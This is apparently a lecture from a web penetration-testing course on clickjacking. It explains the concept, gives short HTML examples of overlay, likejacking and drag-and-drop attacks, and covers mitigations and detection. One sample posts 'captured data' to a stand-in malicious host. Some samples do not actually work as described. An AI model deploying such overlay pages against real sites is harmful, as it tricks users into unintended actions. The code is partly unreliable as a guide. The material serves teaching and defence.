# Click-jacking

## What you will learn in this course üßêüßê

- Understand the concept of Clickjacking
- Learn how to exploit Clickjacking vulnerabilities

![Dikenek](https://cyber-lead-assets.s3.amazonaws.com/M01-Security_Evaluation_and_Testing_(Red)/D04-Web_Pentesting_01/01-lectures/clickjacking.jpg)

Click-jacking is a malicious technique where an attacker tricks users into clicking on something different from what they believe they are interacting with. This is achieved by layering transparent or opaque elements over a legitimate web page or interface, making it appear as though users are clicking on the intended content, while in reality, they are interacting with hidden or disguised elements. It generally work in three steps:

1. **Layering**: The attacker creates a web page with an invisible or disguised overlay that sits on top of a legitimate website or interface. This overlay can be positioned and styled in such a way that it is difficult for users to recognize.

2. **Deceptive Interaction**: When users interact with what they think is the legitimate content (such as a button or link), they are actually clicking on the hidden or disguised elements controlled by the attacker. This can lead to unintended actions being performed.

3. **Consequences**: The unintended actions might include submitting sensitive information, making unauthorized changes to settings, or even performing financial transactions without the user's knowledge. The attacker may exploit these interactions for various malicious purposes, such as stealing personal data, gaining unauthorized access, or defrauding users.

However, it is important to note that clickjacking remains a relatively complex attack to carry out. To succeed, the attacker must overcome a number of technical hurdles, including the need to convince the victim to access a malicious page and to bypass modern security measures such as X-Frame-Options security headers and strict content policies (CSPs). These factors make clickjacking less common than other types of attack, although it can still pose significant risks in contexts where protection is insufficient.

## Exploitation

An attacker exploits clickjacking by embedding a target web application within an iframe on a malicious website. The attacker then overlays this iframe with deceptive content, such as buttons or links, that appear harmless to the user. When the user interacts with the visible content, they are actually interacting with the hidden interface of the target application, causing them to unknowingly perform actions like changing settings, submitting forms, or initiating transactions. Here is how a typical click-jacking attack should happen:

1. The attacker creates a malicious page that loads a legitimate site in a transparent iframe.

2. The user interacts with the visible elements, not realizing they are actually interacting with the hidden interface.

3. This can lead to actions such as changing settings, making transactions, or other unintended actions.

![ClickJacking](https://cyber-lead-assets.s3.amazonaws.com/M01-Security_Evaluation_and_Testing_(Red)/D04-Web_Pentesting_01/01-lectures/Clickjacking.png)

## Clickjacking Techniques

Clickjacking techniques deceive users into interacting with unintended elements or performing actions they did not intend. Below are various methods used in clickjacking, along with concrete examples.

### Transparent Overlay

**Description**: This technique involves placing an invisible iframe over a legitimate page. Users believe they are interacting with the visible content, but their clicks are captured by the hidden iframe underneath.

**Vulnerable Code Example**:

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        .container {
            position: relative;
            width: 500px;
            height: 300px;
        }
        .legitimate {
            position: absolute;
            z-index: 1;
            width: 100%;
            height: 100%;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            z-index: 2;
            width: 100%;
            height: 100%;
            opacity: 0; /* Makes the iframe invisible */
        }
    </style>
</head>
<body>
    <div class="container">
        <iframe src="https://legitimate-site.com" class="legitimate"></iframe>
        <iframe src="https://malicious-site.com" class="overlay"></iframe>
    </div>
</body>
</html>
```

**Attack Execution**: The user interacts with what appears to be a legitimate site, but their clicks are actually directed to the malicious iframe, which could perform unintended actions.

### Framing

**Description**: Attackers place malicious controls over specific elements on a legitimate page. For example, they might overlay buttons or links from the malicious page onto the legitimate one, misleading users into clicking on unintended elements.

**Vulnerable Code Example**:

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        .frame {
            position: absolute;
            top: 20px;
            left: 20px;
            width: 100px;
            height: 50px;
            border: none;
        }
        .legitimate {
            z-index: 1;
        }
        .malicious {
            z-index: 2;
            opacity: 0.5; /* Slight transparency to make it appear deceptive */
        }
    </style>
</head>
<body>
    <iframe src="https://legitimate-site.com" class="frame legitimate"></iframe>
    <iframe src="https://malicious-site.com" class="frame malicious"></iframe>
</body>
</html>
```

**Attack Execution**: The malicious iframe overlays parts of the legitimate page, causing users to unknowingly interact with the malicious content.

### Likejacking

**Description**: This technique tricks users into clicking on a hidden "Like" button on social media platforms. Users think they are performing a different action, but they end up liking a page or content without their consent.

**Vulnerable Code Example**:

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        .hidden-like {
            position: absolute;
            top: 0;
            left: 0;
            width: 200px;
            height: 200px;
            opacity: 0; /* Hides the like button */
        }
    </style>
</head>
<body>
    <div>
        <h1>Click here!</h1>
        <a href="https://example.com">
            <img src="https://example.com/harmless-content" />
        </a>
    </div>
    <iframe src="https://social-media-site.com/like-button" class="hidden-like"></iframe>
</body>
</html>
```

**Attack Execution**: When users click on what they believe to be a harmless element, they are actually triggering the hidden like button, which could affect their social media interactions.

### Cursorjacking

**Description**: This technique manipulates the cursor‚Äôs appearance or position, leading users to click on unintended elements. It often exploits browser vulnerabilities or plugins.

**Vulnerable Code Example**:

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        .fake-button {
            position: absolute;
            top: 50px;
            left: 50px;
            width: 100px;
            height: 50px;
            background-color: red;
            z-index: 1;
        }
        .real-button {
            position: absolute;
            top: 50px;
            left: 50px;
            width: 100px;
            height: 50px;
            background-color: green;
            z-index: 2;
            opacity: 0; /* Hides the real button */
        }
    </style>
</head>
<body>
    <div class="fake-button">Click me!</div>
    <div class="real-button"></div>
</body>
</html>
```

**Attack Execution**: The attacker positions a visible element over a hidden button, making it appear as though the user is interacting with the visible element, while actually clicking the hidden button.

### Drag-and-Drop

**Description**: This technique involves creating draggable elements or forms that appear legitimate. When users interact with these elements, their data is captured by the attacker.

**Vulnerable Code Example**:

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        .drag-drop {
            width: 200px;
            height: 100px;
            background-color: blue;
            color: white;
            text-align: center;
            line-height: 100px;
        }
    </style>
</head>
<body>
    <div class="drag-drop" draggable="true">
        Drag me!
        <form action="https://malicious-site.com/submit-data" method="POST">
            <input type="hidden" name="data" value="captured-data">
        </form>
    </div>
</body>
</html>
```

**Attack Execution**: The attacker sets up a draggable element that, when interacted with, submits sensitive information to their server.

### UI Redressing

**Description**: Also known as user interface redressing, this technique alters the appearance of UI elements using CSS to trick users into clicking on unintended elements.

**Vulnerable Code Example**:

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        .button {
            position: relative;
            z-index: 1;
            width: 200px;
            height: 50px;
            background-color: blue;
            color: white;
            text-align: center;
            line-height: 50px;
        }
        .hidden-button {
            position: absolute;
            top: 0;
            left: 0;
            width: 200px;
            height: 50px;
            background-color: red;
            opacity: 0.5; /* Makes it partially transparent */
            z-index: 2;
        }
    </style>
</head>
<body>
    <div class="button">Click me!</div>
    <div class="hidden-button">Submit form</div>
</body>
</html>
```

**Attack Execution**: By positioning a partially transparent button over a legitimate button, users are tricked into performing actions on the hidden button.

### Social Engineering

**Description**: Attackers use deceptive tactics, such as phishing emails or fake notifications, to lure users to malicious pages where clickjacking attacks are executed.

**Vulnerable Code Example**:

An attacker might send an email claiming a user needs to update their account settings and include a link to a malicious page that uses clickjacking to perform unauthorized actions.

**Attack Execution**: Users click on a link in a phishing email, which directs them to a malicious page designed to execute a clickjacking attack, such as authorizing a transaction or changing account settings without their knowledge.

These techniques exploit vulnerabilities in how web pages are displayed and interacted with, leading to unintended actions by users.

## Mitigation Techniques

Effectively safeguarding against clickjacking attacks involves implementing several strategic measures that reinforce the security of web applications. One fundamental approach is the use of the **X-Frame-Options HTTP header**, which controls whether a browser should be allowed to render a page within a `<frame>`, `<iframe>`, `<embed>`, or `<object>` tag. Setting this header to `DENY` ensures that the content cannot be framed at all, providing robust protection by preventing any other site from embedding your pages. Alternatively, configuring it to `SAMEORIGIN` allows framing only by pages from the same origin, offering flexibility while still mitigating risks from external sources.

```http
X-Frame-Options: DENY
```

Another comprehensive defense mechanism is the implementation of **Content Security Policy (CSP)** with the `frame-ancestors` directive. CSP provides granular control over which domains are permitted to embed your content, allowing you to specify trusted sources explicitly. For instance, setting `frame-ancestors 'self' https://trusted-site.com;` ensures that only your own domain and specified trusted domains can frame your content, thereby reducing the attack surface for potential clickjacking attempts.

```http
Content-Security-Policy: frame-ancestors 'self' https://trusted-site.com;
```

In addition to HTTP headers, deploying **frame-busting scripts** adds an extra layer of security by using JavaScript to prevent your web pages from being framed. A simple script checks whether the current window is the topmost window and, if not, redirects the user or takes other protective actions. Although some advanced attackers may find ways to circumvent these scripts, they remain a valuable part of a multi-layered security strategy.

```javascript
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
```

**User awareness and education** also play a critical role in mitigating clickjacking threats. Informing users about the dangers of interacting with unfamiliar or suspicious websites can significantly reduce the likelihood of successful attacks. Encouraging safe browsing habits and providing guidance on recognizing deceptive interfaces empower users to act cautiously and avoid potential traps set by attackers.

Regular **security assessments and audits** are essential to identify and address vulnerabilities proactively. Conducting thorough penetration testing and code reviews helps uncover weaknesses that could be exploited for clickjacking. Keeping all software and dependencies up to date, along with adhering to secure coding practices, ensures that new and existing threats are effectively managed.

Combining these mitigation techniques creates a robust defense against clickjacking attacks, protecting both the integrity of web applications and the security of users interacting with them.

## Detection Techniques

Identifying clickjacking attempts requires a combination of vigilant monitoring and proactive analysis to ensure that any malicious activities are promptly detected and addressed. One effective method involves **examining HTTP headers** regularly to confirm that security directives like `X-Frame-Options` and `Content-Security-Policy` are correctly implemented and functioning as intended. Any misconfigurations or omissions in these headers can expose applications to clickjacking, so consistent validation is crucial.

Conducting **comprehensive security audits and penetration tests** allows organizations to simulate attack scenarios and evaluate the resilience of their systems against clickjacking. These assessments should scrutinize how web pages behave when embedded within frames and identify any contexts where protective measures may fail. By systematically testing various embedding techniques and framing contexts, potential vulnerabilities can be uncovered and remediated before being exploited.

Analyzing **user interaction patterns and behaviors** can also reveal indicators of clickjacking. Sudden spikes in specific user actions, such as unexpected form submissions or configuration changes, may suggest that users are being manipulated through deceptive interfaces. Correlating these patterns with other data points, such as the referral sources and session contexts, helps in identifying and investigating potential attacks.

## Resources

- [OWASP Clickjacking](https://owasp.org/www-community/attacks/Clickjacking)
- [PortSwigger on Clickjacking](https://portswigger.net/web-security/clickjacking)
